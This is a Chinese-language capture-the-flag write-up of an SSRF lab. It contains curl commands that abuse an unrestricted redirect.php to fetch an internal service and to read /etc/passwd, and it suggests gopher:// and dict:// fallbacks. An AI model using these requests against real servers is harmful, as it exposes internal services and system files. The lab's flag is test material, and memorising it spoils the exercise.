## 题解

### 入口与指纹

`Apache/2.4.54` + `X-Powered-By: PHP/7.4.33`，标题 `SSRF Demo`。

首页把答案写在正文里：

```html
<h1>Company portal</h1>
<p>Additional information is available internally for our employees at
   http://internal-service<br>
   The service is only accessible from our internal network.</p>
<form action="redirect.php" method="GET">
  <input type="text" id="url" name="url" placeholder="http://example.com">
</form>
```

`redirect.php?url=` 用 `file_get_contents()` 抓取任意 URL，结果回显在 `<pre>` 里。

### 关键观察

**1. 服务端直接回显抓取内容。**

```bash
curl --get --data-urlencode 'url=http://internal-service' http://$T/redirect.php
```

```html
<h1>Fetched Content</h1><pre>&lt;!DOCTYPE html&gt;…</pre>
```

内容是 HTML 转义后放进 `<pre>`，所以看源码即可。

**2. 没有任何 URL 白名单/协议限制。**

额外验证过（说明这题的防护为零）：

```bash
curl --get --data-urlencode 'url=file:///etc/passwd' http://$T/redirect.php
# root:x:0:0:root:/root:/bin/bash …
```

`file://` 都放行。

### 利用链

```bash
T=$(head -1 .target)
curl -sS --get --data-urlencode 'url=http://internal-service' \
  "http://$T/redirect.php" \
| python3 -c 'import sys,html,re; s=sys.stdin.read(); \
m=re.search(r"<pre>(.*)</pre>",s,re.S); print(html.unescape(m.group(1)))'
```

内网服务返回：

```html
<body>
  <h1>Internal Service</h1>
  <p>This is a sensitive internal service.</p>
FLAG: flag{efd3f121-74bc-4c4a-b5b3-c0fe8a5db948}</body>
```

### flag 位置

`http://internal-service/` 的响应正文（`FLAG:` 之后），
只能通过 `redirect.php` 从容器内部访问。

## 复盘

- **题目本身把 SSRF 的目标写在了页面上。** `http://internal-service` 直接给出，
  不需要扫内网、不需要猜域名。**先读完页面文字再动手**是最省时间的一步。
- **回显型 SSRF 的判据是"服务端抓取并返回"。** 这里连 `<pre>` 里的转义都保留了，
  只要 `html.unescape` 就能看到原始内容。
- **顺手确认 `file://` 是否可用。** 一次请求就能判断过滤强度：
  本题连协议都不限，说明完全没有防护；真实场景里如果 `file://` 被禁，
  再考虑 `gopher://`、`dict://` 或内网 HTTP。
- **`http://internal-service` 能解析说明容器内有 DNS/hosts 记录。**
  这类"内部域名"在 SSRF 题里很常见，比扫 172.x 网段便宜得多；
  题面给了名字就直接用。
